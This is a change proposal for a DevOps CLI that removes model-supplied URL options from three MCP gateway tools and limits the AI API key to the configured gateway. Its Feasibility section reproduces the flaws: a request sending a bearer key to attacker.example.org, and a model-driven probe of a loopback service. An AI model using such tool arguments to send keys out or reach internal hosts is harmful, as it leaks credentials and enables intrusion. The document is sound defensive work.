# Proposal

## Why

Issue #2480. The MCP tools `ai_gateway_status`, `ai_gateway_routes` and `ai_gateway_probe_backend` are read-only tools. Each tool published a URL option, `gateway_url` or `backend_url`, that the calling model fills in. The command used that URL as configuration. This caused two defects.

1. A URL from the model dialled at the configured level. Since #2422, this level admits loopback without `ai.allow_private_network`. A call of `ai_gateway_probe_backend` with a loopback `backend_url` sent GET requests to a service of the host. The tool returned the status and the model names.
2. The model query put `Authorization: Bearer <AI API key>` on the request to each URL. A call of `ai_gateway_routes` with a public `gateway_url` sent the key to that host. No egress level stops this, because each level admits a public address.

Both defects have one cause. Input from a caller is used as configuration.

## What Changes

- The three MCP tools publish no URL option. `ai_gateway_status` and `ai_gateway_routes` publish only `provider`. `ai_gateway_probe_backend` publishes only `backend`. The tools query the configured gateway and backend. A call that gives a URL fails and sends no request. The commands keep `--gateway-url` and `--backend-url` for a person.
- `fetch_model_info` sends the AI API key only to a gateway that the configuration names. `ai.gateway_url` and `ai.portkey_url` name a gateway. The check compares scheme, host and port. `devops ai gateway routes` and `devops ai gateway tune` get the rule through this function.
- A gateway of another origin that refuses the request gets an error. The error says that the gateway got no key. It does not ask for a key.
- The help of `--gateway-url` for `routes` and `tune` says that only the configured gateway gets the key.
- `SECURITY.md` gets principle 11, the rule for a URL that a model gives to an MCP tool.
- A consumer sees the tool schemas and the requests, so the change carries a spec delta. It adds three requirements to the capability `ai-gateway-routing`.
- This change fits one pull request.

## Capabilities

### New Capabilities

None.

### Modified Capabilities

- `ai-gateway-routing`: three new requirements. "The MCP gateway tools publish no URL" gives the tool schemas and the refusal of a URL. "The MCP gateway tools dial the configured gateway at the configured level" gives the level of their requests. "The AI API key goes only to the configured gateway" gives the origin rule of the model query.

## Impact

- `src/devops_cli/ai/gateway.py`, `src/devops_cli/ai/client/openai.py`, `src/devops_cli/ai/mcp/generator.py`, `src/devops_cli/commands/ai_gateway.py`.
- `tests/test_ai_gateway.py`.
- `docs/MCP_TOOLS.md`, `docs/CLI_REFERENCE.md` and `docs/commands/ai.md` (generated), and `SECURITY.md`.

## Feasibility

- On `origin/main` at `a3eb41f4`, a test with `scripted_resolver` and `record_connects` from `tests/web_fakes.py` showed both defects.
  - `GatewayRouter(...).list_routes("https://attacker.example.org/v1")` dialled `93.184.215.14:443`. It wrote `GET /v1/model/info` with `Authorization: Bearer sk-secret`.
  - The tool `ai_gateway_routes` wrote the same request when it got `gateway_url`.
  - The tool `ai_gateway_probe_backend` dialled `127.0.0.1:8200` when it got a loopback `backend_url`. `ai.allow_private_network` was false. It wrote `GET /v1/sys/seal-status?x=/health` and returned `healthy: true`.
- `generate_mcp_tools` publishes each Click option of a command. `_PATH_PARAM_RESTRICTIONS` in `src/devops_cli/ai/mcp/generator.py` is the existing way to publish fewer options. `telemetry profile` uses it. `ArgumentContractMiddleware` refuses a parameter that the published schema does not name.
- httpx2 2.13.1: `httpx2.URL(...).origin` holds the scheme, host and port. It treats `http://a.example.com` and `HTTP://A.Example.com:80` as equal. `get_url_origin` wraps it. The benchmark runner uses it for the same key rule (#954).
- `fetch_model_info` has four callers. They are `GatewayRouter.list_routes`, `tune_pool`, `gateway_pool` of the run store, and the reasoning check of the OpenAI client. A person can type the URL of the first two. Only `list_routes` sits behind an MCP tool.
- After the change, a probe of `tune_pool` with another origin and an HTTP 401 answer wrote no key. It raised the refusal that names the gateway.

## Existing Tool Considered

The change uses `httpx2.URL.origin` through `get_url_origin`. It also uses the `_PATH_PARAM_RESTRICTIONS` table of the MCP generator and the argument contract of the MCP server. No open tool attaches a credential by the origin of a request. httpx strips an `Authorization` header only when a redirect leaves the origin, never on the first request. So the change builds two small functions, `_key_for` and `_withheld_key_refusal`.

The cost of the two functions is about 3,000 tokens to build and about 500 tokens for each later change that keeps them. The test class `TestTheKeyGoesOnlyToTheConfiguredGateway` is the part to fix when the rule changes. The build takes about one hour.

The change deletes the `gateway_url` and `backend_url` options of the three MCP tools. It deletes the send of the key to every URL.
